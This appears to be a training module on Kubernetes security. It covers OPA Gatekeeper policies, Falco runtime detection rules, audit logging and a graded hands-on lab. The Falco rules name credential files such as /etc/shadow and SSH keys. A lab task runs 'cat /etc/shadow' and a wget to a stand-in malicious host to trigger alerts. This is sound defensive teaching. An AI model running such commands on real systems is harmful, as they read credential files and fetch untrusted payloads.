# Module 10 — Advanced Security

## What You'll Actually Do

You'll deploy OPA Gatekeeper for policy enforcement, Falco for runtime threat detection, and implement comprehensive security monitoring. This is about catching attacks that bypass preventive controls.

## Core Concepts

### Defense in Depth

Preventive controls (RBAC, network policies, image scanning) stop known attacks. Detective controls catch what slips through. Runtime security catches attacks happening right now.

### OPA Gatekeeper

Gatekeeper uses Open Policy Agent to enforce policies at admission time. Unlike simple validation, Gatekeeper can:
- Validate existing resources (audit mode)
- Modify resources (mutation)
- Enforce complex business logic

```yaml
# Require labels on all resources
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Namespace"]
    excludedNamespaces:
    - kube-system
    - kube-public
  parameters:
    labels:
    - key: "team"
      allowedRegex: "^[a-z]+$"
```

### Gatekeeper Templates

Templates define the policy logic:

```yaml
# Constraint template for requiring resource limits
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredresourcelimits
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredResourceLimits
      validation:
        openAPIV3Schema:
          type: object
          properties:
            maxCpu:
              type: string
            maxMemory:
              type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredresourcelimits

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not container.resources.limits.cpu
          msg := sprintf("Container %v must have CPU limits", [container.name])
        }

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not container.resources.limits.memory
          msg := sprintf("Container %v must have memory limits", [container.name])
        }
```

### Falco — Runtime Threat Detection

Falco monitors system calls and detects suspicious behavior:
- Unexpected process execution
- File access anomalies
- Network connections to unexpected destinations
- Privilege escalation attempts
- Container escapes

```bash
# Install Falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco --namespace falco --create-namespace

# Custom rules
cat > custom-rules.yaml << 'EOF'
- rule: Unexpected outbound connection
  desc: Detect outbound connections to unexpected destinations
  condition: >
    evt.type=connect and
    container and
    not proc.name in (allowed_outbound_processes) and
    fd.typechar='4'
  output: >
    Unexpected outbound connection
    (command=%proc.cmdline connection=%fd.name container=%container.id
    image=%container.image.repository)
  priority: WARNING
  tags: [network, container]

- rule: Sensitive file read in container
  desc: Detect reads to sensitive files inside containers
  condition: >
    open_read and
    container and
    fd.name in (/etc/shadow, /etc/passwd, /root/.ssh/id_rsa)
  output: >
    Sensitive file read in container
    (file=%fd.name command=%proc.cmdline container=%container.id
    image=%container.image.repository)
  priority: CRITICAL
  tags: [filesystem, container]

- rule: Unexpected process in container
  desc: Detect processes not in the container's expected set
  condition: >
    spawned_process and
    container and
    not proc.name in (allowed_container_processes)
  output: >
    Unexpected process in container
    (command=%proc.cmdline container=%container.id
    image=%container.image.repository)
  priority: WARNING
  tags: [process, container]
EOF

helm upgrade falco falcosecurity/falco \
  --namespace falco \
  --set-file customRules."events\.yaml"=custom-rules.yaml
```

### Falco Alerts and Integration

```yaml
# falco-alert-pod.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-alerts
  namespace: falco
data:
  falco.yaml: |
    json_output: true
    http_output:
      enabled: true
      url: http://falco-sidecar:2801/
      user_agent: "falco/0.35"
    syslog_output:
      enabled: false
    file_output:
      enabled: true
      filename: /var/log/falco/events.log
    grpc_output:
      enabled: false
```

### Kubernetes Audit + Falco Integration

```yaml
# Audit policy to capture security-relevant events
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log pod exec sessions
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["pods/exec"]
    verbs: ["create"]

  # Log secrets access
  - level: Metadata
    resources:
    - group: ""
      resources: ["secrets"]

  # Log RBAC changes
  - level: RequestResponse
    resources:
    - group: "rbac.authorization.k8s.io"
      resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
    verbs: ["create", "update", "patch", "delete"]

  # Log admission webhook changes
  - level: RequestResponse
    resources:
    - group: "admissionregistration.k8s.io"
      resources: ["mutatingwebhookconfigurations", "validatingwebhookconfigurations"]
    verbs: ["create", "update", "patch", "delete"]
```

### Security Monitoring Dashboard

```yaml
# Grafana dashboard for security events
# Panels to create:
# 1. Falco alerts over time (time series)
# 2. Top alert types (pie chart)
# 3. Container privilege escalations (stat)
# 4. Network anomalies (table)
# 5. Failed authentication attempts (time series)
# 6. RBAC changes (log panel)
```

## Hands-On Lab

### Task 1: Deploy OPA Gatekeeper

```bash
# Install Gatekeeper
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/v3.15.0/deploy/gatekeeper.yaml

# Wait for pods to be ready
kubectl get pods -n gatekeeper-system -w

# Verify installation
kubectl get crd | grep gatekeeper
```

### Task 2: Create and Enforce Policies

```bash
# Apply the required labels template
kubectl apply -f - << 'EOF'
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: object
                properties:
                  key:
                    type: string
                  allowedRegex:
                    type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels

        violation[{"msg": msg}] {
          provided := {label | input.review.object.metadata.labels[label]}
          required := {label | label := input.parameters.labels[_].key}
          missing := required - provided
          count(missing) > 0
          msg := sprintf("Missing required labels: %v", [missing])
        }

        violation[{"msg": msg}] {
          label := input.parameters.labels[_]
          value := input.review.object.metadata.labels[label.key]
          label.allowedRegex != ""
          not re_match(label.allowedRegex, value)
          msg := sprintf("Label %v value %v does not match pattern %v", [label.key, value, label.allowedRegex])
        }
EOF

# Create a constraint
kubectl apply -f - << 'EOF'
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Namespace"]
  parameters:
    labels:
    - key: "team"
      allowedRegex: "^[a-z]+$"
EOF

# Test — should fail (no team label)
kubectl create namespace test-no-label

# Test — should pass
kubectl create namespace test-with-label --dry-run=server -o yaml | \
  kubectl label --local -f - team=dev -o yaml | kubectl apply -f -
```

### Task 3: Deploy Falco

```bash
# Install Falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --namespace falco --create-namespace \
  --set falcosidekick.enabled=true

# Verify Falco is running
kubectl get pods -n falco

# Check Falco logs
kubectl logs -n falco -l app=falco --tail=20
```

### Task 4: Generate and Detect Threats

```bash
# Run a container with suspicious behavior
kubectl run threat-test --image=alpine --rm -it -- sh

# Inside the container, try suspicious activities:
# 1. Read sensitive files
cat /etc/shadow

# 2. Install unexpected software
apk add nmap

# 3. Make unexpected network connections
wget http://malicious-site.com/payload

# Check Falco alerts
kubectl logs -n falco -l app=falco --tail=50 | grep -i "warning\|critical"

# Check the Falco events log
kubectl exec -n falco $(kubectl get pods -n falco -l app=falco -o jsonpath='{.items[0].metadata.name}') \
  -- cat /var/log/falco/events.log | tail -20
```

### Task 5: Create Custom Falco Rules

```bash
# Add custom rules for your environment
kubectl create configmap falco-custom-rules \
  --from-file=custom-rules.yaml \
  -n falco

# Update Falco to use custom rules
helm upgrade falco falcosecurity/falco \
  --namespace falco \
  --set-file customRules."custom-rules\.yaml"=custom-rules.yaml

# Verify custom rules are loaded
kubectl logs -n falco -l app=falco | grep "Loading rules"
```

### Task 6: Build a Security Monitoring Dashboard

```bash
# In Grafana, create a security dashboard:

# Panel 1: Falco Alert Rate
# Query: rate(falco_events_total[5m])

# Panel 2: Top Alert Types
# Query: topk(10, sum by (rule) (falco_events_total))

# Panel 3: Critical Alerts
# Query: falco_events_total{priority="Critical"}

# Panel 4: Container Privilege Escalations
# Query: falco_events_total{rule=~".*privilege.*"}

# Panel 5: Network Anomalies
# Query: falco_events_total{rule=~".*network.*"}

# Export the dashboard JSON
```

## Assessment

**Lab Task**: Deploy OPA Gatekeeper and Falco. Create at least 3 Gatekeeper policies and 2 custom Falco rules. Demonstrate policy enforcement and threat detection. Document all findings.

**Time**: 65 minutes

**Grading** (100 points):
- Gatekeeper deployed and operational (15 pts)
- At least 3 Gatekeeper policies enforced (20 pts)
- Falco deployed and detecting events (15 pts)
- At least 2 custom Falco rules created (20 pts)
- Threat detection demonstrated (15 pts)
- Security dashboard created (15 pts)

## Evidence

Save the following to your evidence folder:
1. `gatekeeper-policies.yaml` — all Gatekeeper constraint templates and constraints
2. `gatekeeper-enforcement.txt` — evidence of policy enforcement (kubectl output)
3. `falco-rules.yaml` — your custom Falco rules
4. `falco-alerts.txt` — Falco alert output from threat simulation
5. `security-dashboard.json` — exported Grafana dashboard
6. `security-findings.md` — summary of all security controls and findings
